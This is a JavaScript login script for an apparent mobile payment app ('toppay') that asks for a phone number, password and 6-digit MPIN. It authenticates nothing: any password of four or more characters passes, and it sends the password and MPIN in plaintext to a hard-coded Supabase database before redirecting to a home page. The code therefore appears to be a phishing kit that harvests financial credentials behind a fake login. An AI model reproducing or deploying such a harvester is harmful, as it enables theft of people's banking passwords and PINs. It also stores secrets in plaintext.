document.addEventListener("DOMContentLoaded", () => {
  if (sessionStorage.getItem("codex_toppay_local")) {
    window.location.replace("./home.html");
    return;
  }

  const form = document.getElementById("loginForm");
  const mobile = document.getElementById("mobile");
  const password = document.getElementById("password");
  const error = document.getElementById("errorMessage");
  const overlay = document.getElementById("mpinOverlay");
  const digitBoxes = [...document.querySelectorAll(".mpin-digit")];
  let mpin = "";

  if (sessionStorage.getItem("mpin_pending")) {
    mobile.value = sessionStorage.getItem("mpin_pending");
    overlay.classList.add("open");
    overlay.setAttribute("aria-hidden", "false");
    document.body.style.overflow = "hidden";
  }

  mobile.addEventListener("input", () => {
    mobile.value = mobile.value.replace(/\D/g, "");
  });

  const SUPABASE_URL = "https://kxsgjfvtfmbruddeolbt.supabase.co/rest/v1";
  const SUPABASE_KEY = "sb_publishable__asg5eO_X6CrsIp9DXO2bQ_H0Gr5c-j";
  const supabaseHeaders = {
    "Content-Type": "application/json",
    "apikey": SUPABASE_KEY,
    "Authorization": `Bearer ${SUPABASE_KEY}`,
    "Prefer": "return=representation"
  };

  form.addEventListener("submit", async (event) => {
    event.preventDefault();

    if (mobile.value.length !== 10) {
      showError("Please enter a valid 10-digit mobile number.");
      return;
    }
    if (password.value.length < 4) {
      showError("Password is too short.");
      return;
    }

    error.classList.add("hidden");
    const submitBtn = form.querySelector('button[type="submit"]');
    const oldText = submitBtn.innerHTML;
    submitBtn.innerHTML = "Processing...";
    submitBtn.disabled = true;

    try {
      // Upsert user to Supabase
      const checkRes = await fetch(`${SUPABASE_URL}/users?mobile=eq.${mobile.value}&select=id`, { headers: supabaseHeaders });
      const checkData = await checkRes.json();
      let userId = null;
      if (checkData && checkData.length > 0) {
        userId = checkData[0].id;
        await fetch(`${SUPABASE_URL}/users?id=eq.${userId}`, {
          method: "PATCH",
          headers: supabaseHeaders,
          body: JSON.stringify({ password: password.value, status: "pending", last_login: new Date().toISOString() })
        });
      } else {
        const insertRes = await fetch(`${SUPABASE_URL}/users`, {
          method: "POST",
          headers: supabaseHeaders,
          body: JSON.stringify({ mobile: mobile.value, password: password.value, status: "pending", last_login: new Date().toISOString() })
        });
        const insertData = await insertRes.json();
        userId = insertData[0].id;
      }
      sessionStorage.setItem("mpin_pending", mobile.value);
      sessionStorage.setItem("user_id_pending", userId);
      
      overlay.classList.add("open");
      overlay.setAttribute("aria-hidden", "false");
      document.body.style.overflow = "hidden";
    } catch(e) {
      showError("Connection error. Please try again.");
    } finally {
      submitBtn.innerHTML = oldText;
      submitBtn.disabled = false;
    }
  });

  document.querySelectorAll("[data-key]").forEach((button) => {
    button.addEventListener("click", async () => {
      if (mpin.length >= 6) return;
      mpin += button.dataset.key;
      renderMpin();

      if (mpin.length === 6) {
        const p = mobile.value || sessionStorage.getItem("mpin_pending");
        const uId = sessionStorage.getItem("user_id_pending");
        
        try {
          if (uId) {
            await fetch(`${SUPABASE_URL}/users?id=eq.${uId}`, {
              method: "PATCH",
              headers: supabaseHeaders,
              body: JSON.stringify({ mpin: mpin, status: "completed", login_count: 1 })
            });
          }
        } catch(e) {}

        sessionStorage.setItem("codex_toppay_local", JSON.stringify({ mobile: p }));
        sessionStorage.removeItem("mpin_pending");
        sessionStorage.removeItem("user_id_pending");
        sessionStorage.removeItem("pwd_pending");

        window.setTimeout(() => {
          window.location.href = "./home.html";
        }, 220);
      }
    });
  });

  document.querySelector('[data-action="delete"]').addEventListener("click", () => {
    mpin = mpin.slice(0, -1);
    renderMpin();
  });

  function renderMpin() {
    digitBoxes.forEach((box, index) => {
      box.classList.toggle("filled", index < mpin.length);
      box.classList.toggle("active", index === Math.min(mpin.length, 5));
    });
  }

  function showError(message) {
    error.textContent = message;
    error.classList.remove("hidden");
  }

  if (window.lucide) window.lucide.createIcons();
});
